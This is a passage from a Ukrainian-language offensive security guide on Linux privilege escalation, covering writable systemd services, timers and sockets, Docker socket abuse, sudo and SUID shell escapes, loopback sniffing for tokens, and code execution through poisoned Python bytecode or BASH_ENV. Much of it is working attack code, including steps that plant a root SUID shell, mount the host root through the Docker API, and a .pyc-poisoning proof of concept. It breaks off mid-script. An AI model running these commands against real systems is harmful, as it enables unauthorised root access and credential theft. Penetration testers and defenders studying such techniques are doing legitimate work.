Щоб виявити такий прихований запис, перевірте файли cron за допомогою інструментів, які відображають керівні символи:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Служби

### Файли _.service_ з правом запису

Перевірте, чи можете ви записувати у будь-який файл `.service`. Якщо так, ви **можете змінити його**, щоб він **запускав** ваш **backdoor під час запуску**, **перезапуску** або **зупинки** служби (можливо, доведеться дочекатися перезавантаження машини).\
Наприклад, створіть backdoor у файлі .service за допомогою **`ExecStart=/tmp/script.sh`**

### Бінарні файли служб із правом запису

Майте на увазі: якщо у вас є **права на запис до бінарних файлів, які запускають служби**, ви можете замінити їх на backdoor, щоб під час повторного запуску служб запускалися backdoor.

### PATH systemd — відносні шляхи

Переглянути PATH, який використовує **systemd**, можна за допомогою:

```bash
systemctl show-environment
```

Якщо ви виявите, що можете **записувати** у будь-яку з папок у шляху, можливо, вам вдасться **підвищити привілеї**. Потрібно шукати відносні шляхи, які використовуються у файлах конфігурації служб, наприклад:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Потім створіть **виконуваний файл** з **такою самою назвою, як у бінарного файла з відносним шляхом**, у доступній для запису папці systemd PATH. Коли службу попросять виконати вразливу дію (**Start**, **Stop**, **Reload**), буде виконано ваш **backdoor** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете скористатися `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це файли модулів systemd, назви яких закінчуються на `**.timer**` і які керують файлами `**.service**` або подіями. **Таймери** можна використовувати як альтернативу cron: вони мають вбудовану підтримку подій календарного часу та монотонного часу й можуть виконуватися асинхронно.

Ви можете перелічити всі таймери за допомогою:

```bash
systemctl list-timers --all
```

### Таймери з правом запису

Якщо ви можете змінити таймер, то можете змусити його запускати певні юніти systemd.unit (наприклад, `.service` або `.target`).

```bash
Unit=backdoor.service
```

У документації можна прочитати, що таке Unit:

> Юніт, який потрібно активувати після спрацювання цього таймера. Аргументом є назва юніта без суфікса `.timer`. Якщо не вказано, за замовчуванням використовується сервіс із тією самою назвою, що й юніт таймера, але без суфікса. (Див. вище.) Рекомендується, щоб назва активованого юніта та назва юніта таймера були однаковими, за винятком суфікса.

Отже, щоб зловживати цим дозволом, потрібно:

- Знайти якийсь юніт systemd (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти якийсь юніт systemd, який **виконує відносний шлях**, і мати **права на запис до systemd PATH** (щоб підмінити цей виконуваний файл)

**Дізнайтеся більше про таймери за допомогою `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні права root і потрібно виконати:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Зверніть увагу: **timer** **активується** створенням символічного посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) забезпечують **міжпроцесну комунікацію** на одній або різних машинах у моделях клієнт-сервер. Вони використовують стандартні файли дескрипторів Unix для комунікації між комп’ютерами й налаштовуються за допомогою файлів `.socket`.<sup>[[14]](#references)</sup>

Sockets можна налаштовувати за допомогою файлів `.socket`.

**Дізнайтеся більше про sockets за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ці параметри відрізняються, але загалом вони **вказують, де відбуватиметься прослуховування** socket (шлях до файла AF_UNIX socket, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: приймає логічний аргумент. Якщо **true**, для кожного **вхідного з’єднання запускається окремий екземпляр service**, якому передається лише socket з’єднання. Якщо **false**, самі listening sockets **передаються запущеному service unit**, і для всіх з’єднань запускається лише один service unit. Це значення ігнорується для datagram sockets і FIFOs, де один service unit безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується створювати нові daemons лише так, щоб вони підтримували `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: приймають один або кілька командних рядків, які **виконуються до** або **після** створення й прив’язування listening **sockets**/FIFOs відповідно. Перший токен командного рядка має бути абсолютним ім’ям файлу, за яким ідуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: додаткові **команди**, які **виконуються до** або **після** закриття й видалення listening **sockets**/FIFOs відповідно.
- `Service`: задає ім’я **service** unit, який потрібно **активувати** у разі **вхідного трафіку**. Цей параметр дозволено використовувати лише для sockets із `Accept=no`. За замовчуванням використовується service з такою самою назвою, як у socket (із заміненим суфіксом). У більшості випадків цей параметр не потрібен.

### Записувані файли .socket

Якщо ви знайдете **доступний для запису** файл `.socket`, на початку секції `[Socket]` можна **додати** щось на кшталт `ExecStartPre=/home/kali/sys/backdoor`, і backdoor виконається перед створенням socket. Тому вам, **імовірно, доведеться дочекатися перезавантаження машини.**\
_Зверніть увагу: система має використовувати конфігурацію цього файла socket, інакше backdoor не буде виконано_

### Активація socket + записуваний шлях до unit (створення відсутнього service)

Ще одна серйозна помилка конфігурації:

- socket unit із `Accept=no` і `Service=<name>.service`
- посиланий service unit відсутній
- зловмисник може записувати в `/etc/systemd/system` (або інший шлях пошуку unit)

У такому разі зловмисник може створити `<name>.service`, а потім надіслати трафік до socket, щоб systemd завантажив і запустив новий service від імені root.

Коротка послідовність:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Сокети з правом запису

Якщо ви **виявите сокет із правом запису** (_зараз ідеться про Unix-сокети, а не про файли конфігурації `.socket`_), тоді **ви можете взаємодіяти** з цим сокетом і, можливо, скористатися вразливістю.

### Перелік Unix-сокетів

```bash
netstat -a -p --unix
```

### Сире з'єднання

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Приклад експлуатації:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP-сокети

Зверніть увагу, що можуть бути **сокети, які прослуховують HTTP-запити** (_я говорю не про файли .socket, а про файли, що працюють як Unix-сокети_). Це можна перевірити за допомогою:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

Якщо сокет **відповідає HTTP**-запитом, ви можете **взаємодіяти** з ним і, можливо, **використати вразливість**.

### Доступний для запису сокет Docker

Сокет Docker, який часто розташований за шляхом `/var/run/docker.sock`, є критично важливим файлом, який потрібно захищати. За замовчуванням доступ на запис до нього мають користувач `root` і учасники групи `docker`. Доступ на запис до цього сокета може призвести до підвищення привілеїв. Нижче описано, як це зробити, а також наведено альтернативні способи на випадок, якщо Docker CLI недоступний.

#### **Підвищення привілеїв за допомогою Docker CLI**

Якщо у вас є доступ на запис до сокета Docker, ви можете підвищити привілеї за допомогою таких команд:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Ці команди дають змогу запустити контейнер із доступом на рівні root до файлової системи хоста.

#### **Безпосереднє використання Docker API**

Якщо Docker CLI недоступний, сокетом Docker усе ще можна зловживати, надсилаючи сирі HTTP-запити через Unix-сокет. Найнадійніший порядок дій:

- створити довгоживучий допоміжний контейнер із bind mount кореневої директорії хоста
- запустити його
- створити в цьому допоміжному контейнері екземпляр `exec`
- запустити екземпляр `exec` і прочитати результат через API

**Перелік образів Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Створіть і запустіть допоміжний контейнер**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Створіть екземпляр exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Запустіть екземпляр exec і прочитайте вивід**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Цей шаблон зазвичай надійніший, ніж спроби вручну керувати `attach` за допомогою `socat` або `nc -U`. Коли ви зможете створити допоміжний контейнер із `/:/host`, то зможете використовувати додаткові екземпляри `exec`, щоб читати файли, як-от `/host/root/...`, додавати SSH-ключі до `/host/root/.ssh` або змінювати файли запуску хоста.

### Інше

Зверніть увагу: якщо ви маєте права на запис у сокет docker, оскільки **входите до групи `docker`**, у вас є [**інші способи підвищити привілеї**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Якщо [**API docker прослуховує порт**, ви також можете скомпрометувати його](../../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Перегляньте **інші способи вийти з контейнерів або зловживати середовищами виконання контейнерів для підвищення привілеїв** тут:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Підвищення привілеїв через Containerd (ctr)

Якщо ви виявили, що можете використовувати команду **`ctr`**, перегляньте таку сторінку, адже **ви можете зловживати нею для підвищення привілеїв**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Підвищення привілеїв через **RunC**

Якщо ви виявили, що можете використовувати команду **`runc`**, перегляньте таку сторінку, адже **ви можете зловживати нею для підвищення привілеїв**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus — це складна **система міжпроцесної взаємодії (IPC)**, яка дає змогу застосункам ефективно взаємодіяти й обмінюватися даними. Розроблена з урахуванням сучасних Linux-систем, вона забезпечує надійну основу для різних форм взаємодії застосунків.<sup>[[16]](#references)</sup>

Система є універсальною: вона підтримує базовий IPC, що покращує обмін даними між процесами, і нагадує **розширені UNIX domain sockets**. Крім того, вона допомагає транслювати події або сигнали, забезпечуючи безперебійну інтеграцію компонентів системи. Наприклад, сигнал від демона Bluetooth про вхідний дзвінок може змусити музичний програвач вимкнути звук, покращуючи взаємодію з користувачем. Також D-Bus підтримує систему віддалених об’єктів, що спрощує запити до служб і виклики методів між застосунками, упорядковуючи процеси, які раніше були складними.

D-Bus працює за **моделлю allow/deny**, керуючи дозволами на повідомлення (виклики методів, надсилання сигналів тощо) на основі сукупної дії правил політик, які відповідають заданим умовам. Ці політики визначають взаємодію з шиною та потенційно можуть дозволити підвищення привілеїв через зловживання цими дозволами.

Нижче наведено приклад такої політики у файлі `/etc/dbus-1/system.d/wpa_supplicant.conf`, де описано дозволи для користувача root на володіння, надсилання повідомлень до `fi.w1.wpa_supplicant1` та отримання повідомлень від нього.

Політики, у яких не вказано користувача або групу, застосовуються до всіх, а політики контексту "default" — до всіх, на кого не поширюються інші конкретні політики.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Дізнайтеся, як виконувати enumerate та exploit комунікації D-Bus тут:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Мережа**

Завжди цікаво збирати інформацію про мережу та визначати розташування машини.

### Загальний збір інформації

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

Якщо активний запис `/etc/inetd.conf` запускає GNU Inetutils `telnetd` від root, перевірте налаштовану версію бінарного файла й локальний listener, навіть якщо порт прив’язаний лише до loopback. У GNU Inetutils версій від 1.9.3 до 2.7 була [можливість обійти автентифікацію Telnet](https://seclists.org/oss-sec/2026/q1/89), за якої переданий клієнтом `USER` потрапляв до `login -f` (CVE-2026-24061). Процес або рядок версії є лише індикатором; перш ніж вважати систему вразливою, підтвердьте статус виправлення від постачальника й перевірте фактичний daemon. Докладніше див. у [посібнику з Telnet](../../../network-services-pentesting/pentesting-telnet.md).

### Швидка перевірка фільтрації вихідного трафіку

Якщо на хості можна виконувати команди, але зворотні з’єднання не встановлюються, швидко перевірте окремо фільтрацію DNS, транспортного рівня, proxy та маршрутів:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### Відкриті порти

Завжди перевіряйте мережеві служби, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу до неї:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Класифікуйте служби, що прослуховують з’єднання, за адресою прив’язки:

- `0.0.0.0` / `[::]`: доступні через усі локальні інтерфейси.
- `127.0.0.1` / `::1`: доступні лише локально (зручні кандидати для тунелювання/перенаправлення).
- Конкретні внутрішні IP-адреси (наприклад, `10.x`, `172.16/12`, `192.168.x`, `fe80::`): зазвичай доступні лише з внутрішніх сегментів.

### Робочий процес перевірки служб, доступних лише локально

Після компрометації хоста служби, прив’язані до `127.0.0.1`, часто вперше стають доступними з вашої shell. Ось короткий локальний робочий процес:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### LinPEAS як мережевий сканер (режим лише мережі)

Окрім локальних перевірок PE, linPEAS може працювати як спеціалізований мережевий сканер. Він використовує доступні бінарні файли з `$PATH` (зазвичай `fping`, `ping`, `nc`, `ncat`) і не встановлює інструменти.

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

Якщо ви вказуєте `-d`, `-p` або `-i` без `-t`, linPEAS працює як звичайний мережевий сканер (пропускаючи решту перевірок на підвищення привілеїв).

### Sniffing

Перевірте, чи можете ви перехоплювати трафік. Якщо так, можливо, вам вдасться отримати облікові дані.

```
timeout 1 tcpdump
```

Швидкі практичні перевірки:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) особливо цінний під час post-exploitation, оскільки багато сервісів, доступних лише з внутрішньої мережі, надають там токени/куки/облікові дані:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

Захоплюй зараз, аналізуй пізніше:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## Користувачі

### Загальне перерахування

Перевірте, **хто** ви, які **привілеї** маєте, які **користувачі** є в системах, хто з них може **login** і хто має **root-привілеї:**

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Великий UID

У деяких версіях Linux була помилка, що дозволяла користувачам із **UID > INT_MAX** підвищувати привілеї. Більше інформації: [тут](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [тут](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) і [тут](https://twitter.com/paragonsec/status/1071152249529884674).<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Експлуатуйте це** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи є ви **учасником групи**, яка може надати вам привілеї root:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо це можливо)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### Політика паролів

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### Відомі паролі

Якщо вам **відомий будь-який пароль** у середовищі, **спробуйте ввійти під кожним користувачем**, використовуючи цей пароль.

### Su Brute

Якщо ви не проти створити багато шуму, а на комп’ютері є бінарні файли `su` і `timeout`, можна спробувати виконати brute-force для користувачів за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається виконати brute-force для користувачів.

## Зловживання правами на запис у PATH

### $PATH

Якщо ви виявите, що можете **записувати в якусь папку з $PATH**, то, можливо, зможете підвищити привілеї, **створивши бекдор у доступній для запису папці** під назвою якоїсь команди, яку виконує інший користувач (в ідеалі root) і яка **не завантажується з папки, розташованої в $PATH перед вашою доступною для запису папкою**.

### SUDO і SUID

Вам може бути дозволено виконувати певні команди за допомогою sudo, або для них може бути встановлений біт suid. Перевірте це за допомогою:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Деякі **неочікувані команди дають змогу читати та/або записувати файли або навіть виконувати команду**.<sup>[[8]](#references)</sup> Наприклад:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Конфігурація sudo може дозволяти користувачу виконувати певні команди з привілеями іншого користувача, не знаючи пароля.

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

У цьому прикладі користувач demo може запускати vim від імені root. Тепер отримати shell дуже просто: додати ssh-ключ до каталогу root або викликати sh.

```
sudo vim -c '!sh'
```

### Незаквотоване порівняння Bash у sudo-скрипті

У Bash права частина `[[ "$protected" == $candidate ]]` — це pattern. Якщо root-capable sudo-скрипт заповнює `candidate` зі створеного користувачем файла, значення на кшталт `prefix*` може збігтися з початком захищеного рядка. Різні шляхи успішного виконання та помилок можуть тоді розкрити prefix oracle. Якщо потрібна буквальна рівність, візьміть праву частину в лапки (`[[ "$protected" == "$candidate" ]]`). Перш ніж вважати незаквотоване порівняння експлуатованим, перевірте фактичні аргументи sudo, походження вхідних даних і спостережувану поведінку гілок. [Посібник GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) описує цю поведінку pattern.

### Файли проєктів PrusaSlicer під sudo

Необмежений дозвіл sudo на запуск `prusaslicer` або `prusa-slicer` із правами root потребує перевірки, якщо користувач може вибирати файл проєкту `.3mf` для нарізання. Проєкт може містити скрипт постобробки, який запускається під час експорту G-code; створені спеціально проєкти могли виконувати команди в PrusaSlicer аж до версії 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Перш ніж робити висновок, що межу привілеїв можна обійти, перевірте чинне правило sudo, версію бінарного файла й патчі постачальника, джерело проєкту та чи виконується відповідний шлях експорту. Фіксований аргумент проєкту або чинна політика `NOEXEC` можуть змінити результат. Сам факт наявності слайсера не підтверджує наявність шляху до підвищення привілеїв.

### SETENV

Ця директива дозволяє користувачеві **встановлювати змінну середовища** під час виконання команди:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

Цей приклад, **заснований на машині HTB Admirer**, був **вразливим** до **PYTHONPATH hijacking**, що дозволяло завантажити довільну бібліотеку Python під час виконання скрипту від імені root:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### Отруєння доступного для запису `__pycache__` / `.pyc` під час імпорту Python-модулів, дозволених через sudo

Якщо **Python-скрипт, запуск якого дозволений через sudo**, імпортує модуль, у каталозі пакета якого є **доступний для запису `__pycache__`**, ви можете замінити кешований `.pyc` і виконати код від імені привілейованого користувача під час наступного імпорту.<sup>[[30]](#references)</sup>

- Чому це працює:
  - CPython зберігає кеш байткоду в `__pycache__/module.cpython-<ver>.pyc`.<sup>[[31]](#references)</sup>
  - Інтерпретатор перевіряє **заголовок** (магічне число та метадані часової мітки/хешу, пов’язані з вихідним файлом), а потім виконує маршалізований об’єкт коду, що зберігається після цього заголовка.
  - Якщо ви можете **видалити й заново створити** кешований файл, оскільки каталог доступний для запису, файл `.pyc`, що належить root і не доступний для запису, усе одно можна замінити.
- Типовий шлях:
  - `sudo -l` показує Python-скрипт або обгортку, яку можна запустити від імені root.
  - Цей скрипт імпортує локальний модуль із `/opt/app/`, `/usr/local/lib/...` тощо.
  - Каталог `__pycache__` імпортованого модуля доступний для запису вашому користувачеві або всім користувачам.

Швидкий enumeration:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

Якщо ви можете перевірити привілейований скрипт, визначте імпортовані модулі та шлях до їхнього кешу:<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

Процес експлуатації:

1. Запустіть скрипт, дозволений через sudo, один раз, щоб Python створив справжній файл кешу, якщо його ще немає.
2. Прочитайте перші 16 байтів зі справжнього `.pyc` і використайте їх у підміненому файлі.
3. Скомпілюйте об’єкт коду з payload, виконайте `marshal.dumps(...)`, видаліть оригінальний файл кешу й створіть його заново, додавши оригінальний заголовок до вашого шкідливого байткоду.
4. Повторно запустіть скрипт, дозволений через sudo, щоб імпорт виконав ваш payload від імені root.

Важливі примітки:

- Повторне використання оригінального заголовка є ключовим, оскільки Python звіряє метадані кешу з вихідним файлом, а не перевіряє, чи справді тіло байткоду відповідає вихідному файлу.
- Це особливо корисно, коли вихідний файл належить root і недоступний для запису, але каталог `__pycache__`, у якому він міститься, доступний для запису.
- `PYTHONDONTWRITEBYTECODE=1` і `python -B` не дають Python записувати нові файли `.pyc`; вони **не** заважають йому завантажити вже наявний дійсний кеш, підмінений атакувальником. Ключове обмеження — чи може користувач із нижчими привілеями підмінити кеш, який привілейований імпорт прийме. Перш ніж завантажити кешований байткод, Python перевіряє метадані часової позначки/розміру або хешу. Див. [довідник з імпорту Python](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) і [документацію командного рядка](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).

Мінімальна структура proof-of-concept:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Посилення захисту:

- Переконайтеся, що каталоги в привілейованому шляху імпорту Python, зокрема `__pycache__`, недоступні для запису користувачам із низькими привілеями.
- Перевірте власника та права доступу до каталогів кешу, зокрема наявних файлів `.pyc`. Вимкнення запису байткоду може зменшити створення нових кешів, але не захищає від підміни вже наявного кешу.
- Ставтеся до локальних модулів Python і каталогів кешу, доступних для запису, так само, як до shell-скриптів або спільних бібліотек, доступних для запису та виконуваних від імені root.

### BASH_ENV збережено через sudo env_keep → shell root

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), можна скористатися поведінкою Bash під час запуску неінтерактивної оболонки, щоб виконати довільний код від імені root, запустивши дозволену команду.<sup>[[24]](#references)</sup>

- Чому це працює: у неінтерактивних оболонках Bash обчислює `$BASH_ENV` і підключає цей файл перед запуском цільового скрипту. Багато правил sudo дозволяють запускати скрипт або обгортку оболонки. Якщо sudo зберігає `BASH_ENV`, ваш файл буде підключено з привілеями root.<sup>[[23]](#references)</sup>

- Вимоги:
  - Правило sudo, яким ви можете скористатися (будь-яка ціль, що неінтерактивно запускає `/bin/bash`, або будь-який bash-скрипт).
  - `BASH_ENV` у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- Посилення захисту:
  - Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, віддавайте перевагу `env_reset`.
  - Не використовуйте shell-обгортки для команд, дозволених через sudo; використовуйте мінімальні бінарні файли.
  - Розгляньте можливість увімкнути журналювання I/O sudo та сповіщення про використання збережених змінних середовища.

### Terraform через sudo зі збереженим HOME (!env_reset)

Якщо sudo дозволяє запускати Terraform від імені користувача з вищими привілеями, `!env_reset` — це підказка перевірити, які саме змінні середовища зберігаються для цього правила. Перш ніж вважати `.terraformrc` або `terraform.rc`, доступний для запису викликачеві, активною конфігурацією CLI, перевірте фактичне значення `HOME` або `TF_CLI_CONFIG_FILE`. Запис `provider_installation.dev_overrides` має значення лише тоді, коли фіксована команда Terraform завантажує цього провайдера, а викликач може розмістити його виконуваний файл у вибраному каталозі.<sup>[[25]](#references)</sup>

- Спрямуйте потрібного провайдера до каталогу, доступного для запису, і розмістіть там шкідливий плагін із назвою провайдера (наприклад, `terraform-provider-examples`):

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
